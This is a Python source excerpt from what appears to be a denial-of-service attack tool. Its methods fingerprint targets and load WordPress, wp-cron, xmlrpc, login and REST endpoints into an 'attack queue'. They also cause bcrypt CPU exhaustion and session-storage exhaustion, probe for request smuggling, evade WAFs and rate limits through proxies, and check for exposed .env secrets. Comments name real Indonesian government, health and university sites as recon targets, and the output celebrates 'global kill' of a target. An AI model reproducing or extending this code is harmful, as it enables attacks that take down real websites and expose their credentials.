    def _chaos_wp_plugin_vulnerability_scan(self):
        """[V33] WordPress Plugin Vulnerability Scanner.
        Trained from deep recon of puskesjaten1 and hardosoloplast.
        Identifies installed plugins and maps them to known heavy/vulnerable endpoints."""
        intel = self._chaos_intel
        if intel.get("cms_type") != "wordpress" or intel.get("infra_map", {}).get("wp_plugins_scanned"):
            return
            
        intel["infra_map"]["wp_plugins_scanned"] = True
        
        # Known heavy plugin endpoints (from real-world scanning of Indonesian WP sites)
        plugin_endpoints = {
            # Found on hardosoloplast.com
            "elementor":          ["/wp-admin/admin-ajax.php?action=elementor_ajax", "/?elementor-preview=1"],
            "contact-form-7":     ["/wp-json/contact-form-7/v1/contact-forms", "/?rest_route=/contact-form-7/v1/contact-forms"],
            "revslider":          ["/wp-admin/admin-ajax.php?action=revslider_ajax_action"],
            "all-in-one-seo-pack": ["/wp-json/aioseo/v1/sitemap"],
            "google-site-kit":    ["/wp-json/google-site-kit/v1/core/site/data/"],
            # Found on puskesjaten1
            "embed-any-document": ["/wp-json/ead/v1/"],
            # Common WP plugins found on Indonesian sites
            "woocommerce":        ["/wp-json/wc/v3/products", "/wc-api/v3/", "/?wc-api=wc_gateway_"],
            "yoast":              ["/wp-json/yoast/v1/"],
            "wpforms":            ["/wp-json/wpforms/v1/"],
        }
        
        added = 0
        for plugin, endpoints in plugin_endpoints.items():
            for ep in endpoints:
                if ep not in intel["endpoints_discovered"]:
                    intel["endpoints_discovered"].append(ep)
                    intel["multi_path_queue"].append((ep, "POST_DYN"))
                    added += 1
                    
        if added > 0 and int(REQUESTS_SENT) < 200:
            print(f"{bcolors.OKCYAN}[CHAOS WP-AUDIT] {added} plugin vulnerability endpoints loaded into attack queue.{bcolors.RESET}")

    def _chaos_xmlrpc_status_check(self):
        """[V33+] Smart XMLRPC Availability Check.
        Deep recon revealed:
        - puskesjaten1: xmlrpc.php returns 405 (Method Not Allowed = EXISTS but needs POST)
        - hardosoloplast: xmlrpc.php returns 403 (BLOCKED by LiteSpeed WAF)
        - konisolo/surakarta: 404 (doesn't exist, Laravel sites)
        405 = GOLD, 403 = blocked, 404 = absent. Also checks wp-json 401 = exists."""
        intel = self._chaos_intel
        if intel.get("infra_map", {}).get("xmlrpc_checked") or intel["total_executions"] != 15:
            return
        intel["infra_map"]["xmlrpc_checked"] = True
        
        # Also probe wp-json — even 401 means WordPress REST API exists
        try:
            import urllib.request
            req2 = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/wp-json/")
            req2.add_header('User-Agent', 'Mozilla/5.0')
            try:
                with urllib.request.urlopen(req2, timeout=3) as resp:
                    intel["infra_map"]["wp_json_status"] = "OPEN"
            except urllib.error.HTTPError as e:
                if e.code == 401:
                    intel["infra_map"]["wp_json_status"] = "AUTH_REQUIRED"
                    if int(REQUESTS_SENT) < 500:
                        print(f"{bcolors.OKCYAN}[CHAOS WP-JSON] wp-json exists (401 Auth Required). REST API is real, just protected.{bcolors.RESET}")
                elif e.code == 200:
                    intel["infra_map"]["wp_json_status"] = "OPEN"
        except: pass
        
        try:
            import urllib.request
            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/xmlrpc.php")
            req.add_header('User-Agent', 'Mozilla/5.0')
            try:
                with urllib.request.urlopen(req, timeout=3) as resp:
                    # 200 = wide open (rare but jackpot)
                    intel["infra_map"]["xmlrpc_status"] = "OPEN"
                    if int(REQUESTS_SENT) < 500:
                        print(f"{bcolors.OKGREEN}[CHAOS XMLRPC] xmlrpc.php is WIDE OPEN! XMLRPC_AMP boosted to maximum.{bcolors.RESET}")
            except urllib.error.HTTPError as e:
                if e.code == 405:
                    # Method Not Allowed = exists but needs POST (like puskesjaten1)
                    intel["infra_map"]["xmlrpc_status"] = "POST_ONLY"
                    if int(REQUESTS_SENT) < 500:
                        print(f"{bcolors.OKCYAN}[CHAOS XMLRPC] xmlrpc.php exists (405). POST method required. XMLRPC_AMP enabled.{bcolors.RESET}")
                elif e.code == 403:
                    # Blocked by WAF (like hardosoloplast)
                    intel["infra_map"]["xmlrpc_status"] = "BLOCKED"
                    if int(REQUESTS_SENT) < 500:
                        print(f"{bcolors.WARNING}[CHAOS XMLRPC] xmlrpc.php BLOCKED (403). WAF is filtering. Demoting XMLRPC_AMP.{bcolors.RESET}")
                elif e.code == 404:
                    intel["infra_map"]["xmlrpc_status"] = "ABSENT"
        except: 
            intel["infra_map"]["xmlrpc_status"] = "UNKNOWN"

    def _chaos_response_timing_profiler(self):
        """[V42] External IP Health Monitor.
        Uses hackertarget.com API to check target health from EXTERNAL servers.
        This completely bypasses any IP ban the target firewall has placed on our network.
        The ping originates from hackertarget's infrastructure, not our local IP."""
        intel = self._chaos_intel
        if intel["total_executions"] % 25 != 0:
            return
        
        # Execute external check via our Proxies every 30 seconds
        last_ext_check = intel.get("_last_ext_check_time", 0)
        if time() - last_ext_check < 30:
            return
        intel["_last_ext_check_time"] = time()
            
        try:
            start = time()
            resp_data = b""
            sock = None
            
            # [V43] TRUE Distributed IP Health Check using our Proxy Legion!
            # Since SOCKS5/HTTP parsing is now fixed, we can cleanly probe via our proxies
            success_proxy = False
            for _ in range(8):
                sock = self.open_connection()
                if sock:
                    try:
                        # Send lightweight HTTP HEAD request
                        req = f"HEAD / HTTP/1.1\r\nHost: {self._target.authority}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
                        sock.sendall(req.encode())
                        resp_data = sock.recv(512)
                        if resp_data:
                            success_proxy = True
                            break
                    except: pass
                    finally:
                        Tools.safe_close(sock)
            
            elapsed_ms = (time() - start) * 1000
            
            if success_proxy and b'HTTP/' in resp_data:
                try:
                    status_code = int(resp_data.split(b' ')[1])
                except:
                    status_code = 0
                
                # Estimate latency (divide by attempts to get avg)
                est_latency = max(elapsed_ms / 3, 50)
                intel["health_history"].append(est_latency)
                if len(intel["health_history"]) > 30:
                    intel["health_history"] = intel["health_history"][-30:]
                
                if status_code >= 500:
                    intel["target_getting_weaker"] = True
                    intel["target_is_down"] = False
                    if int(REQUESTS_SENT) < 5000:
                        print(f"{bcolors.OKGREEN}[EXT PROBE] Target returning {status_code} from Proxy Legion! Attack is working!{bcolors.RESET}")
                else:
                    intel["target_getting_weaker"] = False
                    intel["target_is_down"] = False
                    if intel.get("recovery_detected"):
                        intel["recovery_counter"] = intel.get("recovery_counter", 0) + 1
                        print(f"{bcolors.FAIL}[EXT PROBE] Target RECOVERED (HTTP {status_code})! Intensifying attack...{bcolors.RESET}")
                        intel["recovery_detected"] = False
                
                intel["local_network_choked"] = False
                intel["ext_health_status"] = f"HTTP {status_code}"
                
            else:
                # 8 different proxies failed = target is TRULY DOWN/Unreachable via Internet
                intel["target_is_down"] = True
                intel["target_getting_weaker"] = True
                intel["local_network_choked"] = False
                intel["ext_health_status"] = "DOWN"
                intel["health_history"].append(9999)
                if int(REQUESTS_SENT) < 20000:
                    print(f"{bcolors.OKGREEN}[EXT PROBE] Target TIMEOUT from 8 external proxies! Global kill confirmed.{bcolors.RESET}")
                
        except Exception:
            intel["ext_health_status"] = "PROBE_FAIL"

    def _chaos_wp_json_exploitation(self):
        """[V32+] WordPress REST API Endpoint Discovery and Exploitation.
        FIX: puskesjaten1 returns 401 on /wp-json/ (auth required but endpoint EXISTS).
        401 = endpoint is real, just needs authentication. Still exploitable."""
        intel = self._chaos_intel
        if intel.get("cms_type") != "wordpress":
            return
        if "wp_json_mapped" in intel.get("infra_map", {}):
            return
            
        intel["infra_map"]["wp_json_mapped"] = True
        
        # Pre-load known heavy WordPress REST API endpoints
        wp_heavy_endpoints = [
            "/wp-json/wp/v2/posts?per_page=100",
            "/wp-json/wp/v2/pages?per_page=100",
            "/wp-json/wp/v2/comments?per_page=100",
            "/wp-json/wp/v2/users",
            "/wp-json/wp/v2/media?per_page=100",
            "/wp-json/wp/v2/categories?per_page=100",
            "/wp-json/wp/v2/tags?per_page=100",
            "/wp-json/wp/v2/search?search=" + ProxyTools.Random.rand_str(8),
            "/wp-json/wp/v2/posts?search=" + ProxyTools.Random.rand_str(5),
            "/?feed=rss2",
            "/?feed=atom",
            "/wp-login.php",
            "/wp-admin/admin-ajax.php",
            "/wp-cron.php",
        ]
        
        for ep in wp_heavy_endpoints:
            if ep not in intel["endpoints_discovered"]:
                intel["endpoints_discovered"].append(ep)
                
        # Build multi-path queue with these endpoints
        for ep in wp_heavy_endpoints[:8]:
            intel["multi_path_queue"].append((ep, "POST_DYN" if "ajax" in ep or "login" in ep else "WP_SEARCH"))
            
        if int(REQUESTS_SENT) < 200:
            print(f"{bcolors.OKCYAN}[CHAOS WP-JSON] {len(wp_heavy_endpoints)} WordPress REST API attack endpoints loaded.{bcolors.RESET}")

    def _chaos_session_exhaustion(self):
        """[V35] Session Storage Exhaustion Attack.
        PHP/Laravel servers store sessions on disk or in Redis/Memcached.
        Every unique request with no cookies creates a NEW session file.
        With 100K unique requests, the target accumulates 100K session files,
        filling disk I/O and inode limits. Combined with our existing cookie-less
        STEALTH_JA3, every request from a different fingerprint = new session."""
        intel = self._chaos_intel
        if intel["total_executions"] % 100 == 0:
            # Estimate sessions created (each unique fingerprint + no cookie = 1 session)
            intel["session_exhaustion_count"] = intel.get("botnet_nodes_simulated", 0) * max(1, intel["total_executions"] // 50)
            
            if intel["session_exhaustion_count"] > 10000 and intel["total_executions"] % 500 == 0:
                if int(REQUESTS_SENT) < 50000:
                    print(f"{bcolors.WARNING}[CHAOS SESSION-EXHAUST] ~{intel['session_exhaustion_count']} phantom sessions created. Target disk I/O under pressure.{bcolors.RESET}")

    def _chaos_request_smuggling_probe(self):
        """[V35] HTTP Request Smuggling Detection.
        Tests if the target has a front-end/back-end desync vulnerability.
        If the CDN/proxy parses Content-Length differently than the origin,
        we can smuggle requests that bypass WAF rules entirely.
        Technique: Send ambiguous Transfer-Encoding + Content-Length headers."""
        intel = self._chaos_intel
        if intel.get("request_smuggling_active") or intel["total_executions"] != 35:
            return
            
        try:
            import urllib.request
            # Send a probe with conflicting headers
            req = urllib.request.Request(
                f"{self._target.scheme}://{self._target.authority}/",
                method='POST'
            )
            req.add_header('User-Agent', 'Mozilla/5.0')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            req.add_header('Transfer-Encoding', 'chunked')
            req.data = b'0\r\n\r\n'
            
            try:
                with urllib.request.urlopen(req, timeout=3) as resp:
                    status = resp.status
                    # If server accepts chunked + returns 200, it might be vulnerable
                    if status == 200:
                        intel["request_smuggling_active"] = True
                        if int(REQUESTS_SENT) < 1000:
                            print(f"{bcolors.OKGREEN}[CHAOS SMUGGLE] Target accepts Transfer-Encoding:chunked. Request smuggling vector ACTIVE.{bcolors.RESET}")
            except urllib.error.HTTPError as e:
                if e.code in (400, 501):
                    # Server rejects chunked = probably safe from smuggling
                    pass
        except: pass

    def _chaos_response_body_analyzer(self):
        """[V35] Response Body Intelligence Collector.
        Reads actual response content to detect:
        - Error messages that leak server info (stack traces, DB errors)
        - WAF block pages with fingerprints
        - Custom error pages vs generic ones
        - Server resource exhaustion signals (timeout messages, queue full)"""
        intel = self._chaos_intel
        if intel["total_executions"] % 40 != 0:
            return
            
        try:
            import urllib.request
            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
            req.add_header('User-Agent', 'Mozilla/5.0')
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read(4096).decode('utf-8', errors='ignore').lower()
                
                # Check for error/exhaustion signals
                exhaustion_signals = {
                    "502 bad gateway": "UPSTREAM_DOWN",
                    "503 service unavailable": "SERVICE_EXHAUSTED",  
                    "504 gateway timeout": "BACKEND_TIMEOUT",
                    "too many connections": "CONN_POOL_FULL",
                    "max_user_connections": "DB_CONN_EXHAUSTED",
                    "out of memory": "MEMORY_EXHAUSTED",
                    "connection timed out": "BACKEND_SLOW",
                    "resource limit": "RESOURCE_LIMIT_HIT",
                    "queue full": "QUEUE_SATURATED",
                    "worker": "WORKER_THREADS_BUSY",
                }
                
                for signal, label in exhaustion_signals.items():
                    if signal in body:
                        if label not in intel.get("server_error_patterns", []):
                            intel["server_error_patterns"].append(label)
                            print(f"{bcolors.OKGREEN}[CHAOS BODY-INTEL] Server leaking exhaustion signal: {label}. Attack is working!{bcolors.RESET}")
                            
                # Check if we're seeing a WAF block page
                waf_signals = ["access denied", "blocked", "forbidden", "captcha", "ray id", "attention required"]
                for ws in waf_signals:
                    if ws in body and ws not in intel.get("waf_block_signatures", []):
                        intel["waf_block_signatures"].append(ws)
        except urllib.error.HTTPError as e:
            if e.code in (502, 503, 504):
                sig = f"HTTP_{e.code}"
                if sig not in intel.get("server_error_patterns", []):
                    intel["server_error_patterns"].append(sig)
                    print(f"{bcolors.OKGREEN}[CHAOS BODY-INTEL] Target returning {e.code}! Server under extreme stress.{bcolors.RESET}")
        except: pass

    def _chaos_timing_side_channel(self):
        """[V35] Timing Side-Channel Analysis.
        By measuring response times for different endpoints, we can infer:
        - Which endpoints are DB-heavy (slow = DB query)
        - Which are cached (fast = cache hit, useless to attack)  
        - Which are CPU-heavy (consistent medium = template rendering)
        Then we concentrate firepower on the slowest (most expensive) endpoints."""
        intel = self._chaos_intel
        if intel["total_executions"] != 40:
            return
            
        timing = intel["timing_side_channel"]
        test_paths = intel.get("endpoints_discovered", ["/"])[:10]
        
        for path in test_paths:
            try:
                import urllib.request
                start = time()
                req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}{path}")
                req.add_header('User-Agent', 'Mozilla/5.0')
                with urllib.request.urlopen(req, timeout=5) as resp:
                    resp.read(512)
                    elapsed = (time() - start) * 1000
                    timing[path] = round(elapsed)
            except: 
                timing[path] = 9999  # Timeout = expensive
                
        # Sort by slowest (most expensive to serve)
        if timing:
            sorted_paths = sorted(timing.items(), key=lambda x: x[1], reverse=True)
            slowest = sorted_paths[0]
            if int(REQUESTS_SENT) < 1000:
                print(f"{bcolors.OKCYAN}[CHAOS TIMING] Slowest endpoint: {slowest[0]} ({slowest[1]}ms). Prioritizing.{bcolors.RESET}")
            # Set the slowest endpoint as weakpoint target
            if slowest[1] > 500:
                intel["target_weakpoint"] = "POST_DYN"
                # Add slowest paths to high-priority queue
                for path, ms in sorted_paths[:3]:
                    if ms > 300:
                        intel["multi_path_queue"].append((path, "POST_DYN"))

    def _chaos_genetic_payload_evolution(self):
        """[V35] Genetic Algorithm Payload Evolution.
        Evolve query string payloads that cause maximum server stress.
        Each 'generation', we:
        1. Create random query mutations
        2. Test which ones cause the slowest response (= most damage)
        3. Breed the winners into the next generation
        This discovers unique attack patterns that no signature can match."""
        intel = self._chaos_intel
        if intel["total_executions"] % 200 != 0 or intel["total_executions"] == 0:
            return
            
        intel["genetic_payload_gen"] += 1
        gen = intel["genetic_payload_gen"]
        
        # Generate candidate payloads
        rs = ProxyTools.Random.rand_str
        candidates = [
            f"?search={rs(randint(10,50))}&page={randint(1,999)}&sort={randchoice(['date','title','rand','modified'])}",
            f"?q={rs(randint(5,30))}&lang={randchoice(['en','id','jp','de'])}&limit={randint(50,500)}",
            f"?post_type={randchoice(['post','page','attachment','revision'])}&s={rs(20)}&order=DESC&posts_per_page={randint(50,200)}",
            f"?action={randchoice(['search','filter','export','download'])}&key={rs(16)}&format={randchoice(['json','xml','csv'])}",
            f"?category={rs(8)}&tag={rs(8)}&author={randint(1,50)}&year={randint(2020,2026)}&monthnum={randint(1,12)}",
        ]
        
        # Test each candidate's impact
        best_payload = None
        best_time = 0
        
        for candidate in candidates[:3]:
            try:
                import urllib.request
                start = time()
                url = f"{self._target.scheme}://{self._target.authority}/{candidate}"
                req = urllib.request.Request(url)
                req.add_header('User-Agent', 'Mozilla/5.0')
                with urllib.request.urlopen(req, timeout=5) as resp:
                    resp.read(256)
                    elapsed = (time() - start) * 1000
                    if elapsed > best_time:
                        best_time = elapsed
                        best_payload = candidate
            except: pass
                
        if best_payload and best_time > 200:
            # Winner survives - add to uncached paths for repeated use
            if best_payload not in intel.get("uncached_paths", []):
                intel["uncached_paths"].append(best_payload)
            if gen <= 3 and int(REQUESTS_SENT) < 5000:
                print(f"{bcolors.OKCYAN}[CHAOS GENETIC] Gen {gen}: Evolved payload ({best_time:.0f}ms impact): {best_payload[:60]}{bcolors.RESET}")

    def _chaos_entropy_calculator(self):
        """[V35] Shannon Entropy Calculator.
        Measures the randomness of our traffic pattern.
        WAFs flag low-entropy traffic (repetitive patterns).
        We ensure our entropy stays high (>3.5 bits) by diversifying methods."""
        intel = self._chaos_intel
        if intel["total_executions"] % 100 != 0:
            return
            
        import math
        window = intel.get("method_diversity_window", [])
        if len(window) < 10:
            return
            
        # Calculate Shannon entropy
        freq = {}
        for m in window:
            freq[m] = freq.get(m, 0) + 1
        total = len(window)
        entropy = -sum((count/total) * math.log2(count/total) for count in freq.values() if count > 0)
        intel["entropy_score"] = round(entropy, 2)
        
        # If entropy is too low (< 2.0), we're too predictable
        if entropy < 2.0 and intel["total_executions"] > 50:
            intel["exploration_bonus"] = True  # Force method exploration

    def _chaos_wp_cron_exploitation(self):
        """[V34] WordPress Cron Job Exploitation.
        Deep recon of puskesjaten1 revealed: wp-cron.php returns 200 with 0 bytes in 96ms.
        This means WP-Cron is OPEN and not protected. Each hit forces WordPress to:
        1. Check ALL scheduled tasks (plugins, updates, emails)
        2. Execute any pending tasks (CPU + DB heavy)
        3. Even if no tasks pending, the cron check itself queries wp_options table.
        By hammering wp-cron.php, we force continuous DB reads + potential task execution."""
        intel = self._chaos_intel
        if intel.get("cms_type") != "wordpress" or intel.get("infra_map", {}).get("wp_cron_checked"):
            return
            
        if intel["total_executions"] == 20:
            intel["infra_map"]["wp_cron_checked"] = True
            try:
                import urllib.request
                req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/wp-cron.php?doing_wp_cron=1")
                req.add_header('User-Agent', 'Mozilla/5.0')
                with urllib.request.urlopen(req, timeout=3) as resp:
                    if resp.status == 200:
                        intel["wp_cron_available"] = True
                        # Add wp-cron to high-priority attack endpoints
                        cron_paths = [
                            "/wp-cron.php?doing_wp_cron=1",
                            "/wp-cron.php?doing_wp_cron=" + str(time()),
                            "/wp-cron.php",
                        ]
                        for cp in cron_paths:
                            intel["endpoints_discovered"].append(cp)
                            intel["multi_path_queue"].append((cp, "GET"))
                        if int(REQUESTS_SENT) < 500:
                            print(f"{bcolors.OKGREEN}[CHAOS WP-CRON] wp-cron.php is OPEN! Cron exploitation endpoints loaded. DB stress amplified.{bcolors.RESET}")
            except: pass

    def _chaos_login_flood_discovery(self):   
        """[V34] Login Endpoint Discovery & Flood Preparation.
        Deep recon of konisolo.com revealed /login returns 200 (229ms).
        Login forms are CPU-heavy because they:
        1. Hash passwords (bcrypt = intentionally slow, ~100ms per attempt)
        2. Query users table
        3. Generate CSRF tokens
        4. Write to session storage
        By flooding login with random credentials, we force massive bcrypt CPU burn."""
        intel = self._chaos_intel
        if intel.get("login_endpoint") or intel.get("infra_map", {}).get("login_checked"):
            return
            
        if intel["total_executions"] == 25:
            intel["infra_map"]["login_checked"] = True
            login_paths = ["/login", "/wp-login.php", "/admin/login", "/user/login", "/auth/login"]
            
            for path in login_paths:
                try:
                    import urllib.request
                    req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}{path}")
                    req.add_header('User-Agent', 'Mozilla/5.0')
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        if resp.status == 200:
                            body = resp.read(2000).decode('utf-8', errors='ignore').lower()
                            # Verify it's actually a login form (contains password field)
                            if 'password' in body or 'passwd' in body or 'login' in body:
                                intel["login_endpoint"] = path
                                intel["endpoints_discovered"].append(path)
                                intel["multi_path_queue"].append((path, "POST_DYN"))
                                if int(REQUESTS_SENT) < 500:
                                    print(f"{bcolors.WARNING}[CHAOS LOGIN-FLOOD] Login form found at {path}. Bcrypt CPU exhaustion vector activated.{bcolors.RESET}")
                                break
                except: continue

    def _chaos_page_weight_analyzer(self):
        """[V34] Page Weight Analysis.
        Deep recon revealed hardosoloplast.com serves 273KB pages (3.5s response).
        Heavy pages mean:
        1. Server spends more CPU rendering
        2. More bandwidth consumed per request (our attack costs target more $$)
        3. Server memory fills faster with concurrent connections
        If page > 100KB, even simple GET floods become devastatingly effective."""
        intel = self._chaos_intel
        if intel.get("page_weight_bytes") > 0 or intel["total_executions"] != 8:
            return
            
        try:
            import urllib.request
            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
            req.add_header('User-Agent', 'Mozilla/5.0')
            with urllib.request.urlopen(req, timeout=8) as resp:
                body = resp.read()
                intel["page_weight_bytes"] = len(body)
                weight_kb = len(body) / 1024
                
                if weight_kb > 200:
                    category = "EXTREMELY HEAVY"
                elif weight_kb > 100:
                    category = "HEAVY"
                elif weight_kb > 50:
                    category = "MODERATE"
                else:
                    category = "LIGHT"
                    
                if int(REQUESTS_SENT) < 100:
                    print(f"{bcolors.OKCYAN}[CHAOS PAGE-WEIGHT] Page size: {weight_kb:.0f}KB ({category}). Each GET forces {weight_kb:.0f}KB egress from target.{bcolors.RESET}")
                    
                # Calculate bandwidth damage amplification
                if weight_kb > 100:
                    intel["infra_map"]["heavy_page"] = True
                    intel["infra_map"]["page_kb"] = round(weight_kb)
        except: pass

    def _chaos_smart_decoy_traffic(self):
        """[V34] Smart Decoy Traffic Generator.
        Real attackers mix malicious traffic with legitimate-looking browsing.
        This module generates realistic navigation patterns that:
        1. Visit /robots.txt, /sitemap.xml (what real crawlers do)
        2. Load static assets (.css, .js, images)  
        3. Follow internal links naturally
        This makes our traffic stream indistinguishable from real users + Googlebot."""
        intel = self._chaos_intel
        if intel.get("smart_decoy_paths"):
            return
            
        if intel["total_executions"] == 12:
            decoy_paths = [
                "/", "/robots.txt", "/sitemap.xml", "/favicon.ico",
                "/about", "/contact", "/privacy-policy", "/terms",
                "/category/", "/tag/", "/page/2", "/page/3",
            ]
            
            # Add static asset paths that CDNs love to cache (makes us look legit)
            static_decoys = [
                "/wp-content/themes/style.css" if intel.get("cms_type") == "wordpress" else "/assets/css/app.css",
                "/wp-includes/js/jquery/jquery.min.js" if intel.get("cms_type") == "wordpress" else "/js/app.js",
            ]
            
            intel["smart_decoy_paths"] = decoy_paths + static_decoys
            
    def _chaos_waf_evasion_calculator(self):
        """[V34] WAF Evasion Score Calculator.
        Counts how many WAF protection layers we are currently bypassing."""
        intel = self._chaos_intel
        if intel["total_executions"] % 50 != 0:
            return
            
        score = 0
        if intel.get("shadow_protocol_active"): score += 20
        if intel.get("quantum_state_active"): score += 15
        if len(intel.get("fingerprint_pool", [])) > 0: score += 15
        if intel.get("harvested_cookies", {}).get("XSRF-TOKEN"): score += 10
        if intel.get("dead_drop_dns"): score += 10
        if intel.get("psy_ops_active"): score += 10
        if intel.get("multi_vector_active"): score += 10
        if not intel.get("honeypot_detected"): score += 5
        if intel.get("anomaly_score", 100) < 50: score += 5
        intel["waf_evasion_score"] = min(score, 100)

    def _chaos_rate_limit_intelligence(self):
        """[V33] Rate-Limit Counter-Intelligence.
        Trained from surakarta.go.id: X-RateLimit-Remaining counts down (195->194->193...).
        With 200 limit and 1000 proxies: 190 req/proxy = 190,000 total req bypassing the limit.
        This module calculates the optimal req-per-proxy cadence."""
        intel = self._chaos_intel
        threshold = intel.get("rate_limit_threshold")
        if not threshold or not intel.get("has_rate_limit"):
            return
            
        # Calculate safe requests per proxy (90% of limit to avoid trigger)
        safe_per_proxy = int(threshold * 0.90)
        proxy_count = len(PROXY_LIST) if PROXY_LIST else 1
        
        # Set adaptive_rpc to stay under the radar
        intel["adaptive_rpc"] = min(safe_per_proxy, intel.get("adaptive_rpc", 10))
        
        # Calculate theoretical max throughput
        theoretical_max = safe_per_proxy * proxy_count
        if intel["total_executions"] == 20 and int(REQUESTS_SENT) < 500:
            print(f"{bcolors.OKCYAN}[CHAOS RATE-INTEL] Limit: {threshold}/window | Safe: {safe_per_proxy}/proxy | {proxy_count} proxies = {theoretical_max} total req capacity{bcolors.RESET}")

    def _chaos_codeigniter_detection(self):
        """[V36] CodeIgniter Framework Detection.
        Trained from satudata.karanganyarkab.go.id: ci_session cookie is the fingerprint.
        CodeIgniter is VERY common on Indonesian government portals.
        CI weaknesses: session fixation, no built-in rate limiting, 
        CSRF token often disabled, direct DB calls in controllers."""
        intel = self._chaos_intel
        cookies = intel.get("harvested_cookies", {})
        if intel.get("infra_map", {}).get("ci_detected"):
            return
            
        # Check if ci_session cookie was harvested
        ci_cookie = any('ci_session' in str(k).lower() for k in cookies.keys())
        if ci_cookie or (intel.get("server_type") == "unknown" and intel.get("cms_type") == "custom"):
            # Try to confirm by checking for CI-specific headers
            try:
                import urllib.request
                req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
                req.add_header('User-Agent', 'Mozilla/5.0')
                with urllib.request.urlopen(req, timeout=3) as resp:
                    resp_cookies = resp.headers.get('Set-Cookie', '')
                    if 'ci_session' in resp_cookies.lower():
                        intel["infra_map"]["ci_detected"] = True
                        intel["cms_type"] = "codeigniter"
                        intel["backend_framework"] = "codeigniter"
                        intel["backend_lang"] = "php"
                        if int(REQUESTS_SENT) < 200:
                            print(f"{bcolors.OKCYAN}[CHAOS CI-DETECT] CodeIgniter detected (ci_session cookie). PHP backend confirmed.{bcolors.RESET}")
            except: pass

    def _chaos_vercel_detection(self):
        """[V36+] Vercel/Next.js Edge Detection.
        Trained from raynaldotech.my.id: x-vercel-cache, x-nextjs-prerender headers.
        FIX: Cloudflare may return 403, but error response STILL contains headers.
        We must read headers from HTTPError as well!"""
        intel = self._chaos_intel
        if intel.get("infra_map", {}).get("vercel_checked"):
            return
        intel["infra_map"]["vercel_checked"] = True
            
        try:
            import urllib.request
            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
            req.add_header('User-Agent', 'Mozilla/5.0')
            
            hdrs = {}
            try:
                with urllib.request.urlopen(req, timeout=5) as resp:
                    hdrs = dict(resp.headers)
            except urllib.error.HTTPError as e:
                # KEY FIX: Even 403 responses have headers!
                hdrs = dict(e.headers) if hasattr(e, 'headers') else {}
                if e.code == 403:
                    # If CF blocks with 403, the WAF is very aggressive
                    intel["infra_map"]["cf_strict_403"] = True
            
            hdrs_str = str(hdrs).lower()
            
            if 'x-vercel-cache' in hdrs_str or 'x-vercel-id' in hdrs_str:
                intel["infra_map"]["vercel"] = True
                intel["cms_type"] = "nextjs"
                intel["waf_type"] = "cloudflare"
                if int(REQUESTS_SENT) < 200:
                    print(f"{bcolors.WARNING}[CHAOS VERCEL] Vercel Edge detected. Target has enterprise-grade edge protection.{bcolors.RESET}")
                    print(f"{bcolors.WARNING}[CHAOS VERCEL] Only STEALTH_JA3 + SLOW_V2 vectors authorized. All others will be blocked.{bcolors.RESET}")
                    
            # Detect Cloudflare from error headers too
            if 'cloudflare' in hdrs_str or 'cf-ray' in hdrs_str:
                if intel.get("waf_type") in (None, "none", "unknown_heavy"):
                    intel["waf_type"] = "cloudflare"
                    if int(REQUESTS_SENT) < 200:
                        print(f"{bcolors.WARNING}[CHAOS CF] Cloudflare WAF detected from response headers (even on 403 block).{bcolors.RESET}")
                        
            # Check for Nuxt.js
            powered = ''
            for k, v in hdrs.items():
                if k.lower() == 'x-powered-by': powered = v.lower()
            if 'nuxt' in powered:
                intel["infra_map"]["nuxtjs"] = True
                intel["cms_type"] = "nuxtjs"
                if int(REQUESTS_SENT) < 200:
                    print(f"{bcolors.OKCYAN}[CHAOS NUXT] Nuxt.js SSR backend detected. Server-side rendering = heavy per request.{bcolors.RESET}")
                    
            # Check for Google Cloud proxy
            via = ''
            for k, v in hdrs.items():
                if k.lower() == 'via': via = v.lower()
            if 'google' in via:
                intel["infra_map"]["google_cloud"] = True
                if int(REQUESTS_SENT) < 200:
                    print(f"{bcolors.OKCYAN}[CHAOS GCP] Google Cloud infrastructure detected. CDN-level edge caching active.{bcolors.RESET}")
        except: pass

    def _chaos_env_exposure_check(self):
        """[V36+] .env File Exposure Detection.
        uns.ac.id returns 200 with 477 bytes for /.env — CRITICAL security flaw!
        FIX: Read full 500 bytes and check broader patterns including common env vars."""
        intel = self._chaos_intel
        if intel.get("infra_map", {}).get("env_checked"):
            return
        if intel["total_executions"] != 18:
            return
        intel["infra_map"]["env_checked"] = True
        
        try:
            import urllib.request
            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/.env")
            req.add_header('User-Agent', 'Mozilla/5.0')
            with urllib.request.urlopen(req, timeout=4) as resp:
                if resp.status == 200:
                    body = resp.read(500).decode('utf-8', errors='ignore')
                    body_upper = body.upper()
                    env_signals = ['APP_KEY', 'DB_HOST', 'DB_PASSWORD', 'DB_DATABASE',
                                   'SECRET', 'API_KEY', 'MAIL_', 'REDIS_', 'AWS_',
                                   'APP_NAME', 'APP_ENV', 'APP_DEBUG', 'LOG_CHANNEL',
                                   'BROADCAST_', 'CACHE_DRIVER', 'SESSION_DRIVER',
                                   'QUEUE_', 'PUSHER_', 'MIX_']
                    if any(sig in body_upper for sig in env_signals):
                        intel["infra_map"]["env_exposed"] = True
                        if int(REQUESTS_SENT) < 200:
                            print(f"{bcolors.FAIL}[CHAOS CRITICAL] .env file EXPOSED! Server is severely misconfigured. All defenses likely weak.{bcolors.RESET}")
                    elif len(body.strip()) > 50 and '=' in body:
                        # Looks like a config file even without exact matches
                        intel["infra_map"]["env_exposed"] = True
                        if int(REQUESTS_SENT) < 200:
                            print(f"{bcolors.FAIL}[CHAOS CRITICAL] .env file EXPOSED (generic config detected)! Server is weak.{bcolors.RESET}")
        except: pass

    def _chaos_university_heuristics(self):
        """[V36] University Site (.ac.id) Heuristics.
        University sites share common patterns:
        - uns.ac.id: Headless WP, no security headers, .env exposed
        - ums.ac.id: Nuxt.js + Cloudflare + Google Cloud, 432KB page
        - Generally: mixed tech stack, student-managed, outdated software"""
